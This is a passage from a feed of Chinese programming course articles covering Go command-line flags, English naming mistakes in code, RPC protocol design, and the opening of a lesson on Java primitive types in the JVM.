fmt.Fprintf(os.Stderr, &amp;quot;Usage of %s:\n&amp;quot;, &amp;quot;question&amp;quot;)
flag.PrintDefaults()
}
&lt;/code>&lt;/pre>
&lt;p>再运行命令&lt;code>go run demo3.go --help&lt;/code>后，其输出会与上一次的输出的一致。不过后面这种定制的方法更加灵活。比如，当我们把为&lt;code>flag.CommandLine&lt;/code>赋值的那条语句改为&lt;/p>
&lt;pre>&lt;code>flag.CommandLine = flag.NewFlagSet(&amp;quot;&amp;quot;, flag.PanicOnError)
&lt;/code>&lt;/pre>
&lt;p>后，再运行&lt;code>go run demo3.go --help&lt;/code>命令就会产生另一种输出效果。这是由于我们在这里传给&lt;code>flag.NewFlagSet&lt;/code>函数的第二个参数值是&lt;code>flag.PanicOnError&lt;/code>。&lt;code>flag.PanicOnError&lt;/code>和&lt;code>flag.ExitOnError&lt;/code>都是预定义在&lt;code>flag&lt;/code>包中的常量。&lt;/p>
&lt;p>&lt;code>flag.ExitOnError&lt;/code>的含义是，告诉命令参数容器，当命令后跟&lt;code>--help&lt;/code>或者参数设置的不正确的时候，在打印命令参数使用说明后以状态码&lt;code>2&lt;/code>结束当前程序。&lt;/p>
&lt;p>状态码&lt;code>2&lt;/code>代表用户错误地使用了命令，而&lt;code>flag.PanicOnError&lt;/code>与之的区别是在最后抛出&amp;quot;运行时恐慌（panic）&amp;quot;。&lt;/p>
&lt;p>上述两种情况都会在我们调用&lt;code>flag.Parse&lt;/code>函数时被触发。顺便提一句，&amp;ldquo;运行时恐慌&amp;quot;是 Go 程序错误处理方面的概念。关于它的抛出和恢复方法，我在本专栏的后续部分中会讲到。&lt;/p>
&lt;p>下面再进一步，我们索性不用全局的&lt;code>flag.CommandLine&lt;/code>变量，转而自己创建一个私有的命令参数容器。我们在函数外再添加一个变量声明：&lt;/p>
&lt;pre>&lt;code>var cmdLine = flag.NewFlagSet(&amp;quot;question&amp;quot;, flag.ExitOnError)
&lt;/code>&lt;/pre>
&lt;p>然后，我们把对&lt;code>flag.StringVar&lt;/code>的调用替换为对&lt;code>cmdLine.StringVar&lt;/code>调用，再把&lt;code>flag.Parse()&lt;/code>替换为&lt;code>cmdLine.Parse(os.Args[1:])&lt;/code>。&lt;/p>
&lt;p>其中的&lt;code>os.Args[1:]&lt;/code>指的就是我们给定的那些命令参数。这样做就完全脱离了&lt;code>flag.CommandLine&lt;/code>。&lt;code>*flag.FlagSet&lt;/code>类型的变量&lt;code>cmdLine&lt;/code>拥有很多有意思的方法。你可以去探索一下。我就不在这里一一讲述了。&lt;/p>
&lt;p>这样做的好处依然是更灵活地定制命令参数容器。但更重要的是，你的定制完全不会影响到那个全局变量&lt;code>flag.CommandLine&lt;/code>。&lt;/p>
&lt;p>&lt;strong>总结&lt;/strong>&lt;/p>
&lt;p>恭喜你！你现在已经走出了 Go 语言编程的第一步。你可以用 Go 编写命令，并可以让它们像众多操作系统命令那样被使用，甚至可以把它们嵌入到各种脚本中。&lt;/p>
&lt;p>虽然我为你讲解了命令源码文件的基本编写方法，并且也谈到了为了让它接受参数而需要做的各种准备工作，但这并不是全部。&lt;/p>
&lt;p>别担心，我在后面会经常提到它的。另外，如果你想详细了解&lt;code>flag&lt;/code>包的用法，可以到&lt;a href="https://golang.google.cn/pkg/flag/">这个网址&lt;/a>查看文档。或者直接使用&lt;code>godoc&lt;/code>命令在本地启动一个 Go 语言文档服务器。怎样使用&lt;code>godoc&lt;/code>命令？你可以参看&lt;a href="https://github.com/hyper0x/go_command_tutorial/blob/master/0.5.md">这里&lt;/a>。&lt;/p>
&lt;h2 id="思考题">思考题&lt;/h2>
&lt;p>我们已经见识过为命令源码文件传入字符串类型的参数值的方法，那还可以传入别的吗？这就是今天我留下的思考题。&lt;/p>
&lt;ol>
&lt;li>默认情况下，我们可以让命令源码文件接受哪些类型的参数值？&lt;/li>
&lt;li>我们可以把自定义的数据类型作为参数值的类型吗？如果可以，怎样做？&lt;/li>
&lt;/ol>
&lt;p>你可以通过查阅文档获得第一个问题的答案。记住，快速查看和理解文档是一项必备的技能。&lt;/p>
&lt;p>至于第二个问题，你回答起来可能会有些困难，因为这涉及了另一个问题：&amp;ldquo;怎样声明自己的数据类型？&amp;ldquo;这个问题我在专栏的后续部分中也会讲到。如果是这样，我希望你记下它和这里说的另一问题，并在能解决后者之后再来回答前者。&lt;/p>
&lt;p>&lt;a href="https://github.com/hyper0x/Golang_Puzzlers">戳此查看 Go 语言专栏文章配套详细代码。&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/35/48/358e4e8578a706598e18a7dfed3ed648.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 02丨乱用英语：站在中国人的视角来看英文命名</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%91/02%E4%B8%A8%E4%B9%B1%E7%94%A8%E8%8B%B1%E8%AF%AD%E7%AB%99%E5%9C%A8%E4%B8%AD%E5%9B%BD%E4%BA%BA%E7%9A%84%E8%A7%86%E8%A7%92%E6%9D%A5%E7%9C%8B%E8%8B%B1%E6%96%87%E5%91%BD%E5%90%8D/</link><pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%91/02%E4%B8%A8%E4%B9%B1%E7%94%A8%E8%8B%B1%E8%AF%AD%E7%AB%99%E5%9C%A8%E4%B8%AD%E5%9B%BD%E4%BA%BA%E7%9A%84%E8%A7%86%E8%A7%92%E6%9D%A5%E7%9C%8B%E8%8B%B1%E6%96%87%E5%91%BD%E5%90%8D/</guid><description>
&lt;p>你好，我是郑晔。&lt;/p>
&lt;p>上一讲，我们讲了两种常见的命名的坏味道，这一讲的话题还是命名，只不过，这个主题是国外那些经典编程书籍所不曾涵盖的话题：英语命名。&lt;/p>
&lt;p>现在主流的程序设计语言都是以英语为基础的，且不说欧美人设计的各种语言，就连日本人设计的 Ruby、巴西人设计的 Lua，各种语法采用的也全都是英语。所以，想要成为一个优秀的程序员，会用英语写代码是必要的。&lt;/p>
&lt;p>这里并不是说，程序员的英语一定要多好，但&lt;strong>最低限度的要求是写出来的代码要像是在用英语表达&lt;/strong>。&lt;/p>
&lt;p>或许你听说过，甚至接触过国内的一些程序员用汉语拼音写代码，这就是一种典型的坏味道。鉴于现在的一些程序设计语言已经支持了 UTF-8 的编码格式，用汉语拼音写代码，还不如用汉字直接写代码。&lt;/p>
&lt;p>当然，这个坏味道实在是太低级了，我就不在这里深入讨论了。让我们来看看还有哪些可能会不经意间忽略的坏味道。&lt;/p>
&lt;h1 id="违反语法规则的命名">违反语法规则的命名&lt;/h1>
&lt;p>我们来看一段代码：&lt;/p>
&lt;pre tabindex="0">&lt;code>public void completedTranslate(final List&amp;lt;ChapterId&amp;gt; chapterIds) {
List&amp;lt;Chapter&amp;gt; chapters = repository.findByChapterIdIn(chapterIds);
chapters.forEach(Chapter::completedTranslate);
repository.saveAll(chapters);
}
&lt;/code>&lt;/pre>&lt;p>初看之下，这段代码写得还不错，它要做的是将一些章节的信息标记为翻译完成。似乎函数名也能反映这个意思，但仔细一看你就会发现问题。&lt;/p>
&lt;p>因为 completedTranslate 并不是一个正常的英语函数名。从这个名字你能看出，作者想表达的是&amp;quot;完成翻译&amp;quot;，因为是已经翻译完了，所以，他用了完成时的 completed，而翻译是 translate。这个函数名就成了 completedTranslate。由此，你可以看到，作者已经很用心了，但遗憾的是，这个名字还是起错了。&lt;/p>
&lt;p>一般来说，常见的命名规则是：&lt;strong>类名是一个名词，表示一个对象，而方法名则是一个动词，或者是动宾短语，表示一个动作&lt;/strong>。&lt;/p>
&lt;p>以此为标准衡量这个名字，completedTranslate 并不是一个有效的动宾结构。如果把这个名字改成动宾结构，只要把&amp;quot;完成&amp;quot;译为 complete，&amp;ldquo;翻译&amp;quot;用成它的名词形式 translation 就可以了。所以，这个函数名可以改成 completeTranslation：&lt;/p>
&lt;pre tabindex="0">&lt;code>public void completeTranslation(final List&amp;lt;ChapterId&amp;gt; chapterIds) {
List&amp;lt;Chapter&amp;gt; chapters = repository.findByChapterIdIn(chapterIds);
chapters.forEach(Chapter::completeTranslation);
repository.saveAll(chapters);
}
&lt;/code>&lt;/pre>&lt;p>这并不是一个复杂的坏味道，但这种坏味道在代码中却时常可以见到，比如，一个函数名是 retranslation，其表达的意图是重新翻译，&lt;strong>但作为函数名，它应该是一个动词&lt;/strong>，所以，正确的命名应该是 retranslate。&lt;/p>
&lt;p>其实，只要你懂得最基本的命名要求，知道最基本的英语规则，就完全能够发现这里的坏味道。比如，判断函数名里的动词是不是动词，宾语是不是一个名词？这并不需要英语有多么好。自己实在拿不准的时候，你就把这个词放到字典网站中查一下，确保别用错词性就好。&lt;/p>
&lt;p>对于大多数国内程序员来说，字典网站是我们的好朋友，是我们在写程序过程中不可或缺的一个好伙伴。不过，有些人使用字典网站也会很随意。&lt;/p>
&lt;h1 id="不准确的英语词汇">不准确的英语词汇&lt;/h1>
&lt;p>有一次，我们要实现一个章节审核的功能，一个同事先定义出了审核的状态：&lt;/p>
&lt;pre tabindex="0">&lt;code>public enum ChapterAuditStatus {
PENDING,
APPROVED,
REJECTED;
}
&lt;/code>&lt;/pre>&lt;p>你觉得这段代码有问题吗？如果看不出来，一点都不奇怪。如果你用审核作为关键字去字典网站上搜索，确实会得到 audit 这个词。所以，审核状态写成 AuditStatus 简直是再正常不过的事情了。&lt;/p>
&lt;p>然而，看到这个词的时候，我的第一反应就是这个词好像不太对。因为之前我实现了一个作品审核的功能，不过我写的定义是这样的：&lt;/p>
&lt;pre tabindex="0">&lt;code>public enum BookReviewStatus {
PENDING,
APPROVED,
REJECTED;
}
&lt;/code>&lt;/pre>&lt;p>抛开前缀不看，同样是审核，一个用了 audit，一个用了 review。这显然是一种不一致。本着代码一致性的考虑，我希望这两个定义应该采用同样的词汇。&lt;/p>
&lt;p>于是，我把 audit 和 review 同时放到了搜索引擎里查了一下。原来，audit 会有更官方的味道，更合适的翻译应该是审计，而 review 则有更多核查的意思，二者相比，review 更适合这里的场景。于是，章节的审核状态也统一使用了 review：&lt;/p>
&lt;pre tabindex="0">&lt;code>public enum ChapterReviewStatus {
PENDING,
APPROVED,
REJECTED;
}
&lt;/code>&lt;/pre>&lt;p>相比之下，这个坏味道是一个高级的坏味道，英语单词用得不准确。但这个问题确实是国内程序员不得不面对的一个尴尬的问题，我们的英语可能没有那么好，体会不到不同单词之间的差异。&lt;/p>
&lt;p>很多人习惯的做法就是把中文的词扔到字典网站，然后从诸多返回的结果中找一个自己看着顺眼的，而这也往往是很多问题出现的根源。这样写出来的程序看起来就像一个外国人在说中文，虽然你知道他在说的意思，但总觉得哪里怪怪的。&lt;/p>
&lt;p>**在这种情况下，****最好的解决方案还是建立起一个业务词汇表，千万不要臆想。**一般情况下，我们都可以去和业务方谈，共同确定一个词汇表，包含业务术语的中英文表达。这样在写代码的时候，你就可以参考这个词汇表给变量和函数命名。&lt;/p>
&lt;p>下面是一个词汇表的示例，从这个词汇表中你不难看出：一方面，词汇表给出的都是业务术语，同时也给出了在特定业务场景下的含义；另一方面，它也给出了相应的英文，省得你费劲心思去思考。当你遇到了一个词汇表中没有的术语怎么办呢？那就需要找出这个术语相应的解释，然后，补充到术语表里。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/97/1e/976b74fd075d49cf27e198f38bdcec1e.jpg" alt="">&lt;/p>
&lt;p>建立词汇表的另一个关键点就是，&lt;strong>用集体智慧，而非个体智慧&lt;/strong>。你一个人的英语可能没那么好，但一群人总会找出一个合适的说法。我在《软件设计之美》里讲到领域驱动设计时，曾经讲过通用语言，其实，业务词汇表也应该是构建通用语言的一部分成果。&lt;/p>
&lt;h1 id="英语单词的拼写错误">英语单词的拼写错误&lt;/h1>
&lt;p>我再给你看一段曾经让我迷惑不已的代码：&lt;/p>
&lt;pre tabindex="0">&lt;code>public class QuerySort {
private final SortBy sortBy;
private final SortFiled sortFiled;
...
}
&lt;/code>&lt;/pre>&lt;p>初看这段代码时，我还想表扬代码的作者，他知道把查询的排序做一个封装，比起那些把字符串传来传去的做法要好很多。&lt;/p>
&lt;p>但仔细看一下代码，我脑子里就冒出了一系列问号。sortFiled 是啥？排序文件吗？为啥用的还是过去式？归档？&lt;/p>
&lt;p>被这段代码搞晕的我只好打开提交历史，找出这段代码的作者，向他求教。&lt;/p>
&lt;blockquote>
&lt;p>我：这个字段是啥意思？
同事：这是排序的字段啊。
我：排序的字段？
同事：你看，这个查询排序类有两个字段，一个是排序的方式，升序还是降序，另一个就是排序的字段。
我：字段这个单词是这么拼吗？
同事：不是吗？哦！是 field，拼错了，拼错了。&lt;/p>
&lt;/blockquote>
&lt;p>你看，是他把单词拼错了。&lt;/p>
&lt;p>其实，偶尔的拼写错误是不可避免的，这就像我们写文章的时候，出现错别字也是难免的。之所以要在这个专栏中把拼写错误作为一种独立的坏味道，是因为在很多国内程序员写的程序中，见到的拼写错误比例是偏高的。&lt;/p>
&lt;p>在这个故事里面，我都已经当面指出了问题，这个同事甚至都没有第一时间意识到自己的拼写是错误的，这其实说明了一种尴尬的现状：&lt;strong>很多程序员对英语的感觉并没有那么强。&lt;/strong>&lt;/p>
&lt;p>事实上，这个同事不止一次在代码里出现拼写错误了，一些拼写错误是很直白的，一眼就能看出来，所以，通常在代码评审的时候就能发现问题。这次的拼写错误刚好形成了另外一个有含义的单词，所以，我也被困住了。&lt;/p>
&lt;p>对今天的程序员来说，工具已经很进步了，&lt;strong>像 IntelliJ IDEA 这样的 IDE 甚至可以给你提示代码里有拼写错误（typo）&lt;/strong>，不少支持插件的工具也都有自己的拼写检查插件，比如Visual Studio Code 就有自己的拼写检查插件。在这些工具的帮助之下，我们只要稍微注意一下，就可以修正很多这样低级的错误。&lt;/p>
&lt;p>这一讲的内容几乎是完全针对国内程序员的。对于国外程序员来说，他们几乎不会犯这些错误。英语是程序员无论如何也绕不过去的一关，越是想成为优秀程序员，越要对英语有良好的感觉。当然，这里并不强求所有人的英语都能达到多好的程度，至少看到一些明显违反英语规则的代码，自己应该有能力看出来。&lt;/p>
&lt;p>英语和程序设计语言其实是一样的，想用好，唯有多多练习。我自己的英语水平也算不上多好，但我读过很多技术文档，也看了很多开源的代码。之前因为参加开源项目和在外企工作的经历，也写过很多的英语邮件和文档，逐渐对程序中的英语有了感觉。&lt;/p>
&lt;p>有些人注意到，我的开源项目 Moco 的文档是用英语写的，这其实是我强迫自己练习的结果。如果说英语是一门全功能的程序设计语言，那么程序中用到的英语就是一门 DSL（领域特定语言）。相比起完全掌握好英语，掌握程序中用到的英语就要简单一些了。&lt;/p>
&lt;h1 id="总结时刻">总结时刻&lt;/h1>
&lt;p>今天我们讲了几个英语使用不当造成的坏味道：&lt;/p>
&lt;ul>
&lt;li>违反语法规则的命名；&lt;/li>
&lt;li>不准确的英语词汇；&lt;/li>
&lt;li>英语单词的拼写错误。&lt;/li>
&lt;/ul>
&lt;p>这是国内程序员因为语言关系而造成的坏味道，英语是目前软件开发行业的通用语言，一个程序员要想写好程序，要对程序中用到的英语有一个基本的感觉，能够发现代码中的这些坏味道。&lt;/p>
&lt;p>其实，还有一些常见的与语言相关的坏味道，因为比较初级，我只放在这里给你提个醒，比如：&lt;/p>
&lt;ul>
&lt;li>使用拼音进行命名；&lt;/li>
&lt;li>使用不恰当的单词简写（比如，多个单词的首字母，或者写单词其中的一部分）。&lt;/li>
&lt;/ul>
&lt;p>我们还讨论了如何从实践层面上更好地规避这些坏味道：&lt;/p>
&lt;ul>
&lt;li>制定代码规范，比如，类名要用名词，函数名要用动词或动宾短语；&lt;/li>
&lt;li>要建立团队的词汇表（是的，我们在上一讲也提到了）；&lt;/li>
&lt;li>要经常进行代码评审。&lt;/li>
&lt;/ul>
&lt;p>命名之所以如此重要，因为它是一切代码的基础。就像写文章一样，一个错别字满天飞的文章，很难让人相信它会是一篇好的文章，所以，命名的重要性是如何强调都不为过的。&lt;/p>
&lt;p>如果今天的内容你只能记住一件事，那请记住：&lt;strong>编写符合英语语法规则的代码。&lt;/strong>&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/55/7b/556d83849b603cd145f1a1bbfa17567b.jpg" alt="">&lt;/p>
&lt;h1 id="思考题">思考题&lt;/h1>
&lt;p>我们在这一讲里讲到了程序员和英语之间的关系，我想请你分享一下，你在工作中与英语的关系，无论是遇到的问题，或是自我提升的经验，都行。欢迎在留言区分享你的经验，也欢迎你把这节课的内容分享给团队的小伙伴，大家一起精进&amp;quot;英语命名&amp;rdquo;。&lt;/p>
&lt;p>感谢阅读，我们下一讲再见！&lt;/p>
&lt;p>参考资料 :&lt;/p>
&lt;p>领域驱动设计：如何从零开始设计一个软件？&lt;/p>
&lt;p>动词：英语宇宙的中心&lt;/p></description></item><item><title>极客专栏: 02丨协议：怎么设计可扩展且向后兼容的协议？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/rpc%E5%AE%9E%E6%88%98%E4%B8%8E%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/02%E4%B8%A8%E5%8D%8F%E8%AE%AE%E6%80%8E%E4%B9%88%E8%AE%BE%E8%AE%A1%E5%8F%AF%E6%89%A9%E5%B1%95%E4%B8%94%E5%90%91%E5%90%8E%E5%85%BC%E5%AE%B9%E7%9A%84%E5%8D%8F%E8%AE%AE/</link><pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/rpc%E5%AE%9E%E6%88%98%E4%B8%8E%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/02%E4%B8%A8%E5%8D%8F%E8%AE%AE%E6%80%8E%E4%B9%88%E8%AE%BE%E8%AE%A1%E5%8F%AF%E6%89%A9%E5%B1%95%E4%B8%94%E5%90%91%E5%90%8E%E5%85%BC%E5%AE%B9%E7%9A%84%E5%8D%8F%E8%AE%AE/</guid><description>
&lt;p>你好，我是何小锋。上一讲我分享了 RPC 原理，其核心是让我们像调用本地一样调用远程，帮助我们的应用层屏蔽远程调用的复杂性，使得我们可以更加方便地构建分布式系统。总结起来，其实就一个关键字：透明化。&lt;/p>
&lt;p>接着上一讲的内容，我们再来聊聊 RPC 协议。&lt;/p>
&lt;p>一提到协议，你最先想到的可能是 TCP 协议、UDP 协议等等，这些网络传输协议的实现在我看来有点晦涩难懂。虽然在 RPC 中我们也会用到这些协议，但这些协议更多的是对我们上层应用是透明的，我们 RPC 在使用过程中并不太需要关注他们的细节。那我今天要讲的 RPC 协议到底是什么呢？&lt;/p>
&lt;p>可能我举个例子，你立马就明白了。HTTP 协议是不是很熟悉（本讲里面所说的 HTTP 默认都是 1.X）？ 这应该是我们日常工作中用得最频繁的协议了，每天打开浏览器浏览的网页就是使用的 HTTP 协议。那 HTTP 协议跟 RPC 协议又有什么关系呢？看起来他俩好像不搭边，但他们有一个共性就是都属于应用层协议。&lt;/p>
&lt;p>所以**我们今天要讲的 RPC 协议就是围绕应用层协议展开的。**我们可以先了解下 HTTP 协议，我们先看看它的协议格式是什么样子的。回想一下我们在浏览器里面输入一个 URL 会发生什么？抛开 DNS 解析暂且不谈，浏览器收到命令后会封装一个请求，并把请求发送到 DNS 解析出来的 IP 上，通过抓包工具我们可以抓到请求的数据包，如下图所示：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/5c/99/5ca698cbdc61b8e8b090773406b3ab99.jpg" alt="">&lt;/p>
&lt;h1 id="协议的作用">协议的作用&lt;/h1>
&lt;p>看完 HTTP 协议之后，你可能会有一个疑问，我们为什么需要协议这个东西呢？没有协议就不能通信吗？&lt;/p>
&lt;p>我们知道只有二进制才能在网络中传输，所以 RPC 请求在发送到网络中之前，他需要把方法调用的请求参数转成二进制；转成二进制后，写入本地 Socket 中，然后被网卡发送到网络设备中。&lt;/p>
&lt;p>但在传输过程中，RPC 并不会把请求参数的所有二进制数据整体一下子发送到对端机器上，中间可能会拆分成好几个数据包，也可能会合并其他请求的数据包（合并的前提是同一个 TCP 连接上的数据），至于怎么拆分合并，这其中的细节会涉及到系统参数配置和 TCP 窗口大小。对于服务提供方应用来说，他会从 TCP 通道里面收到很多的二进制数据，那这时候怎么识别出哪些二进制是第一个请求的呢？&lt;/p>
&lt;p>这就好比让你读一篇没有标点符号的文章，你要怎么识别出每一句话到哪里结束呢？很简单啊，我们加上标点，完成断句就好了。&lt;/p>
&lt;p>同理在 RPC 传输数据的时候，为了能准确地&amp;quot;断句&amp;quot;，我们也必须在应用发送请求的数据包里面加入&amp;quot;句号&amp;quot;，这样才能帮我们的接收方应用从数据流里面分割出正确的数据。这个数据包里面的句号就是消息的边界，用于标示请求数据的结束位置。举个具体例子，调用方发送 AB、CD、EF 3 个消息，如果没有边界的话，接收端就可能收到 ABCDEF 或者 ABC、DEF 这样的消息，这就会导致接收的语义跟发送的时候不一致了。&lt;/p>
&lt;p>所以呢，为了避免语义不一致的事情发生，我们就需要在发送请求的时候设定一个边界，然后在收到请求的时候按照这个设定的边界进行数据分割。这个边界语义的表达，就是我们所说的协议。&lt;/p>
&lt;h1 id="如何设计协议">如何设计协议？&lt;/h1>
&lt;p>理解了协议的作用，我们再来看看在 RPC 里面是怎么设计协议的。可能你会问：&amp;ldquo;前面你不是说了 HTTP 协议跟 RPC 都属于应用层协议，那有了现成的 HTTP 协议，为啥不直接用，还要为 RPC 设计私有协议呢？&amp;rdquo;&lt;/p>
&lt;p>这还要从 RPC 的作用说起，相对于 HTTP 的用处，RPC 更多的是负责应用间的通信，所以性能要求相对更高。但 HTTP 协议的数据包大小相对请求数据本身要大很多，又需要加入很多无用的内容，比如换行符号、回车符等；还有一个更重要的原因是，HTTP 协议属于无状态协议，客户端无法对请求和响应进行关联，每次请求都需要重新建立连接，响应完成后再关闭连接。因此，对于要求高性能的 RPC 来说，HTTP 协议基本很难满足需求，所以 RPC 会选择设计更紧凑的私有协议。&lt;/p>
&lt;p>&lt;strong>那怎么设计一个私有 RPC 协议呢？&lt;/strong>&lt;/p>
&lt;p>在设计协议前，我们先梳理下要完成 RPC 通信的时候，在协议里面需要放哪些内容。&lt;/p>
&lt;p>首先要想到的就是我们前面说的消息边界了，但 RPC 每次发请求发的大小都是不固定的，所以我们的协议必须能让接收方正确地读出不定长的内容。我们可以先固定一个长度（比如 4 个字节）用来保存整个请求数据大小，这样收到数据的时候，我们先读取固定长度的位置里面的值，值的大小就代表协议体的长度，接着再根据值的大小来读取协议体的数据，整个协议可以设计成这样：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/de/67/debcb69ad381d9d86d13dcc7c72b0967.jpg" alt="">&lt;br>
不定长协议&lt;/p>
&lt;p>但上面这种协议，只实现了正确的断句效果，在 RPC 里面还行不通。因为对于服务提供方来说，他是不知道这个协议体里面的二进制数据是通过哪种序列化方式生成的。如果不能知道调用方用的序列化方式，即使服务提供方还原出了正确的语义，也并不能把二进制还原成对象，那服务提供方收到这个数据后也就不能完成调用了。因此我们需要把序列化方式单独拿出来，类似协议长度一样用固定的长度存放，这些需要固定长度存放的参数我们可以统称为&amp;quot;协议头&amp;quot;，这样整个协议就会拆分成两部分：协议头和协议体。&lt;/p>
&lt;p>在协议头里面，我们除了会放协议长度、序列化方式，还会放一些像协议标示、消息 ID、消息类型这样的参数，而协议体一般只放请求接口方法、请求的业务参数值和一些扩展属性。这样一个完整的 RPC 协议大概就出来了，协议头是由一堆固定的长度参数组成，而协议体是根据请求接口和参数构造的，长度属于可变的，具体协议如下图所示：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/ac/2b/ac5f5236d972608fdb24c6eefce7e82b.jpg" alt="">&lt;br>
定长协议&lt;/p>
&lt;h1 id="可扩展的协议">可扩展的协议&lt;/h1>
&lt;p>刚才讲的协议属于定长协议头，那也就是说往后就不能再往协议头里加新参数了，如果加参数就会导致线上兼容问题。举个具体例子，假设你设计了一个 88Bit 的协议头，其中协议长度占用 32bit，然后你为了加入新功能，在协议头里面加了 2bit，并且放到协议头的最后。升级后的应用，会用新的协议发出请求，然而没有升级的应用收到的请求后，还是按照 88bit 读取协议头，新加的 2 个 bit 会当作协议体前 2 个 bit 数据读出来，但原本的协议体最后 2 个 bit 会被丢弃了，这样就会导致协议体的数据是错的。&lt;/p>
&lt;p>可能你会想：&amp;ldquo;那我把参数加在不定长的协议体里面行不行？而且刚才你也说了，协议体里面会放一些扩展属性。&amp;rdquo;&lt;/p>
&lt;p>没错，协议体里面是可以加新的参数，但这里有一个关键点，就是协议体里面的内容都是经过序列化出来的，也就是说你要获取到你参数的值，就必须把整个协议体里面的数据经过反序列化出来。但在某些场景下，这样做的代价有点高啊！&lt;/p>
&lt;p>比如说，服务提供方收到一个过期请求，这个过期是说服务提供方收到的这个请求的时间大于调用方发送的时间和配置的超时时间，既然已经过期，就没有必要接着处理，直接返回一个超时就好了。那要实现这个功能，就要在协议里面传递这个配置的超时时间，那如果之前协议里面没有加超时时间参数的话，我们现在把这个超时时间加到协议体里面是不是就有点重了呢？显然，会加重 CPU 的消耗。&lt;/p>
&lt;p>所以为了保证能平滑地升级改造前后的协议，我们有必要设计一种支持可扩展的协议。其关键在于让协议头支持可扩展，扩展后协议头的长度就不能定长了。那要实现读取不定长的协议头里面的内容，在这之前肯定需要一个固定的地方读取长度，所以我们需要一个固定的写入协议头的长度。整体协议就变成了三部分内容：固定部分、协议头内容、协议体内容，前两部分我们还是可以统称为&amp;quot;协议头&amp;quot;，具体协议如下：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/2a/72/2a202f980458baca9fc50c53275c6772.jpg" alt="">&lt;br>
可扩展协议&lt;/p>
&lt;p>最后，我想说，**设计一个简单的 RPC 协议并不难，难的就是怎么去设计一个可&amp;quot;升级&amp;quot;的协议。**不仅要让我们在扩展新特性的时候能做到向下兼容，而且要尽可能地减少资源损耗，所以我们协议的结构不仅要支持协议体的扩展，还要做到协议头也能扩展。上述这种设计方法来源于我多年的线上经验，可以说做好扩展性是至关重要的，期待这个协议模版能帮你避掉一些坑。&lt;/p>
&lt;h1 id="总结">总结&lt;/h1>
&lt;p>我们人类区别于其他动物的一个很大原因，就是我们能够通过语言去沟通，用文字去沉淀文明，从而让我们能站在巨人的肩膀上成长，但为了保证我们记录的文字能够被其他人理解，我们必须通过符号去实现断句，否则就可能导致文字的意义被曲解，甚至闹出笑话。&lt;/p>
&lt;p>在 RPC 里面，协议的作用就类似于文字中的符号，作为应用拆解请求消息的边界，保证二进制数据经过网络传输后，还能被正确地还原语义，避免调用方跟被调用方之间的&amp;quot;鸡同鸭讲&amp;quot;。&lt;/p>
&lt;p>但我们在设计协议的时候，也不能只单纯考虑满足目前功能，还应该从更高的层次出发。就好比我们设计系统架构一样，我们需要保证设计出来的系统能够能很好地扩展，支持新增功能。&lt;/p>
&lt;h1 id="课后思考">课后思考&lt;/h1>
&lt;p>好了，今天的内容就到这里，最后留一道思考题。今天我们讨论过 RPC 不直接用 HTTP 协议的一个原因是无法实现请求跟响应关联，每次请求都需要重新建立连接，响应完成后再关闭连接，所以我们要设计私有协议。那么在 RPC 里面，我们是怎么实现请求跟响应关联的呢？&lt;/p>
&lt;p>欢迎留言和我分享你的思考，也欢迎你把文章分享给你的朋友，邀请他加入学习。我们下节课再见！&lt;/p></description></item><item><title>极客专栏: 02丨Java的基本类型</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%B7%B1%E5%85%A5%E6%8B%86%E8%A7%A3jvm%E8%99%9A%E6%8B%9F%E6%9C%BA/02%E4%B8%A8java%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%B7%B1%E5%85%A5%E6%8B%86%E8%A7%A3jvm%E8%99%9A%E6%8B%9F%E6%9C%BA/02%E4%B8%A8java%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/</guid><description>
&lt;p>如果你了解面向对象语言的发展史，那你可能听说过 Smalltalk 这门语言。它的影响力之大，以至于之后诞生的面向对象语言，或多或少都借鉴了它的设计和实现。&lt;/p>
&lt;p>在 Smalltalk 中，所有的值都是对象。因此，许多人认为它是一门纯粹的面向对象语言。&lt;/p>
&lt;p>Java 则不同，它引进了八个基本类型，来支持数值计算。Java 这么做的原因主要是工程上的考虑，因为使用基本类型能够在执行效率以及内存使用两方面提升软件性能。&lt;/p>
&lt;p>今天，我们就来了解一下基本类型在 Java 虚拟机中的实现。&lt;/p>
&lt;pre>&lt;code>public class Foo {
public static void main(String[] args) {
boolean 吃过饭没 = 2; // 直接编译的话 javac 会报错
if (吃过饭没) System.out.println(&amp;quot; 吃了 &amp;quot;);
if (true == 吃过饭没) System.out.println(&amp;quot; 真吃了 &amp;quot;);
}
}
&lt;/code>&lt;/pre>
&lt;p>在上一篇结尾的小作业里，我构造了这么一段代码，它将一个 boolean 类型的局部变量赋值为 2。为了方便记忆，我们给这个变量起个名字，就叫&amp;quot;吃过饭没&amp;quot;。&lt;/p>
&lt;p>赋值语句后边我设置了两个看似一样的 if 语句。第一个 if 语句，也就是直接判断&amp;quot;吃过饭没&amp;quot;，在它成立的情况下，代码会打印&amp;quot;吃了&amp;quot;。&lt;/p>
&lt;p>第二个 if 语句，也就是判断&amp;quot;吃过饭没&amp;quot;和 true 是否相等，在它成立的情况下，代码会打印&amp;quot;真吃了&amp;quot;。&lt;/p>
